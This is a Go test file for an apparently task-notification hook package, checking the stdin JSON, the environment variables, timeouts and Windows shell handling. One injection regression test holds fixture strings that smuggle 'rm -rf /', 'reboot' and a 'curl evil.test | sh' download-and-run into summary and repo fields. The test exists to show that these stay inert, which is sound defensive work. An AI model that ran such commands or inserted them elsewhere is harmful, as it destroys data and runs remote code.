package notify

import (
	"context"
	"encoding/json"
	"os"
	"path/filepath"
	"runtime"
	"strings"
	"testing"
	"time"
)

// TestBuildCommandStdinContract asserts the stable stdin JSON contract: task
// id, status, repo, short summary, run dir, and a galley task show hint.
func TestBuildCommandStdinContract(t *testing.T) {
	t.Parallel()
	ev := Event{
		TaskID:  "task-123",
		Status:  "failed",
		Repo:    "/repos/app",
		Summary: "executor failed on attempt 2",
		RunDir:  "/galley/runs/run-9",
	}
	cmd, cleanup, err := BuildCommand("true", ev, Options{})
	if err != nil {
		t.Fatal(err)
	}
	defer cleanup()
	var got payload
	if err := json.Unmarshal([]byte(strings.TrimSpace(cmd.Stdin)), &got); err != nil {
		t.Fatalf("stdin is not valid JSON: %v (stdin=%q)", err, cmd.Stdin)
	}
	want := payload{
		TaskID:   "task-123",
		Status:   "failed",
		Repo:     "/repos/app",
		Summary:  "executor failed on attempt 2",
		RunDir:   "/galley/runs/run-9",
		ShowHint: "galley task show task-123",
	}
	if got != want {
		t.Fatalf("stdin payload mismatch:\n got %#v\nwant %#v", got, want)
	}
}

// TestBuildCommandEnvMirror asserts the namespaced GALLEY_* environment mirror.
func TestBuildCommandEnvMirror(t *testing.T) {
	t.Parallel()
	ev := Event{TaskID: "t1", Status: "needs_supervisor_review", Repo: "/r", Summary: "s", RunDir: "/d"}
	cmd, cleanup, err := BuildCommand("true", ev, Options{})
	if err != nil {
		t.Fatal(err)
	}
	defer cleanup()
	want := map[string]string{
		"GALLEY_TASK_ID":     "t1",
		"GALLEY_TASK_STATUS": "needs_supervisor_review",
		"GALLEY_REPO":        "/r",
		"GALLEY_SUMMARY":     "s",
		"GALLEY_RUN_DIR":     "/d",
	}
	gotEnv := map[string]string{}
	for _, kv := range cmd.EnvAppend {
		parts := strings.SplitN(kv, "=", 2)
		gotEnv[parts[0]] = parts[1]
	}
	for k, v := range want {
		if gotEnv[k] != v {
			t.Fatalf("env %s = %q, want %q", k, gotEnv[k], v)
		}
	}
	// Task content must never determine a variable name.
	for _, kv := range cmd.EnvAppend {
		name := strings.SplitN(kv, "=", 2)[0]
		if !strings.HasPrefix(name, "GALLEY_") {
			t.Fatalf("non-namespaced env var leaked: %q", name)
		}
	}
}

// TestBuildCommandNeverConcatenatesTaskContent is the injection regression: a
// summary and repo full of shell metacharacters and environment-like names
// must never appear in the command argv. The configured command string is the
// only task-independent value in argv; task content stays in stdin/env.
func TestBuildCommandNeverConcatenatesTaskContent(t *testing.T) {
	t.Parallel()
	malicious := "; rm -rf / $(whoami) `id` && curl evil.test | sh #"
	ev := Event{
		TaskID:  "t",
		Status:  "failed",
		Repo:    "/repo/$PATH/${IFS}name; reboot",
		Summary: malicious,
		RunDir:  "/d",
	}
	cmd, cleanup, err := BuildCommand("/usr/local/bin/notify.sh", ev, Options{GOOS: "linux"})
	if err != nil {
		t.Fatal(err)
	}
	defer cleanup()
	for i, arg := range cmd.Argv {
		if strings.Contains(arg, "rm -rf") || strings.Contains(arg, "reboot") || strings.Contains(arg, "evil.test") {
			t.Fatalf("task content leaked into argv[%d]=%q (full argv=%v)", i, arg, cmd.Argv)
		}
	}
	// The operator command is present verbatim as a single argv element.
	foundCommand := false
	for _, arg := range cmd.Argv {
		if arg == "/usr/local/bin/notify.sh" {
			foundCommand = true
		}
	}
	if !foundCommand {
		t.Fatalf("operator command not found as a discrete argv element: %v", cmd.Argv)
	}
	// And the malicious content is carried as data on stdin and in env.
	if !strings.Contains(cmd.Stdin, "rm -rf") {
		t.Fatalf("expected malicious summary to be carried on stdin as data")
	}
}

func TestRunNonZeroExitReturnsError(t *testing.T) {
	if runtime.GOOS == "windows" {
		t.Skip("uses a POSIX shell command")
	}
	t.Parallel()
	_, err := Run(context.Background(), "exit 3", Event{TaskID: "t", Status: "failed"}, Options{Timeout: 5 * time.Second})
	if err == nil {
		t.Fatal("expected error for non-zero exit, got nil")
	}
}

func TestRunStartFailureReturnsError(t *testing.T) {
	if runtime.GOOS == "windows" {
		t.Skip("uses a POSIX shell command")
	}
	t.Parallel()
	// A command that resolves no executable still starts the shell, which then
	// exits non-zero; either way Run reports an error rather than succeeding.
	_, err := Run(context.Background(), "this-binary-does-not-exist-galley-xyz", Event{TaskID: "t", Status: "failed"}, Options{Timeout: 5 * time.Second})
	if err == nil {
		t.Fatal("expected error when the configured command cannot run, got nil")
	}
}

func TestRunTimeoutReturnsErrorAndIsBounded(t *testing.T) {
	if runtime.GOOS == "windows" {
		t.Skip("uses a POSIX shell command")
	}
	t.Parallel()
	start := time.Now()
	_, err := Run(context.Background(), "sleep 30", Event{TaskID: "t", Status: "failed"}, Options{Timeout: 200 * time.Millisecond})
	if err == nil {
		t.Fatal("expected timeout error for a hanging command, got nil")
	}
	if elapsed := time.Since(start); elapsed > 5*time.Second {
		t.Fatalf("hanging command was not bounded by timeout: elapsed %s", elapsed)
	}
}

// TestRunDeliversStdinToCommand is an end-to-end check that the configured
// command actually receives the stdin JSON, modeling how a real sample script
// reads task data as data rather than via interpolation.
func TestRunDeliversStdinToCommand(t *testing.T) {
	if runtime.GOOS == "windows" {
		t.Skip("uses a POSIX shell command")
	}
	t.Parallel()
	out := filepath.Join(t.TempDir(), "captured.json")
	ev := Event{TaskID: "task-xyz", Status: "failed", Repo: "/r", Summary: "boom", RunDir: "/d"}
	if _, err := Run(context.Background(), "cat > "+out, ev, Options{Timeout: 5 * time.Second}); err != nil {
		t.Fatalf("hook run failed: %v", err)
	}
	data, err := os.ReadFile(out)
	if err != nil {
		t.Fatal(err)
	}
	var got payload
	if err := json.Unmarshal([]byte(strings.TrimSpace(string(data))), &got); err != nil {
		t.Fatalf("captured stdin is not valid JSON: %v", err)
	}
	if got.TaskID != "task-xyz" || got.Status != "failed" || got.ShowHint != "galley task show task-xyz" {
		t.Fatalf("captured payload mismatch: %#v", got)
	}
}

func TestTruncateRunesUsesRuneBoundary(t *testing.T) {
	t.Parallel()
	s := strings.Repeat("あ", summaryMaxRunes+50)
	got := truncateRunes(s, summaryMaxRunes)
	if r := []rune(got); len(r) != summaryMaxRunes+1 { // +1 for the ellipsis
		t.Fatalf("expected %d runes, got %d", summaryMaxRunes+1, len(r))
	}
	if !strings.HasSuffix(got, "…") {
		t.Fatal("expected ellipsis suffix on truncated summary")
	}
}

// TestBuildCommandWindowsShellResolution proves the hook reuses profilecmd's
// Windows shell resolution path, materializing a wrapper script under the
// provided scratch dir, so Windows invocation is covered by the same shell
// selection rules as required checks.
func TestBuildCommandWindowsShellResolution(t *testing.T) {
	t.Parallel()
	scratch := t.TempDir()
	cmd, cleanup, err := BuildCommand("echo hi", Event{TaskID: "t", Status: "failed"}, Options{GOOS: "windows", ScratchDir: scratch})
	if err != nil {
		t.Fatal(err)
	}
	defer cleanup()
	if len(cmd.Argv) == 0 {
		t.Fatal("expected a non-empty argv for the windows shell plan")
	}
	// The materialized wrapper script lives under the scratch dir.
	last := cmd.Argv[len(cmd.Argv)-1]
	if !strings.HasPrefix(last, scratch) {
		t.Fatalf("expected windows wrapper script under scratch dir %q, got argv %v", scratch, cmd.Argv)
	}
}
